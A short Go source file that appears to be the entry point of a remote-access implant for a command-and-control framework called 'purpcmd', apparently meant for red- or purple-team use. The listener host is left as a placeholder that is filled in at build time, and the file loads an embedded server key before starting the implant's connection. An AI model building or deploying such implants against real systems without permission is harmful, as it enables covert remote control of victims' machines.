package main

import (
	"purpcmd/implant/core"
	"purpcmd/internal/encrypt"
)

// Public key DER bytes - replaced during build
var publicKeyDER []byte

func main() {
	//ua := "Mozilla PurpCMD"
	//uri := "/"
	remoteAdd := "LHOST"          // Replaced
	payloadType := "IMPLANT_TYPE" // Replaced
	//ps := "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDm7lFJASftWM9Bmw+sQnjNtr48wXhSRDf43XUhbfRBT05j5dZ4+2qUhPt5gugkECSINzOs2nGz0hkCFTGDqPIM="

	// Load the embedded server public key
	if len(publicKeyDER) > 0 {
		encrypt.SetGlobalPublicKeyDER(publicKeyDER)
	}

	core.Start(remoteAdd, payloadType)
}
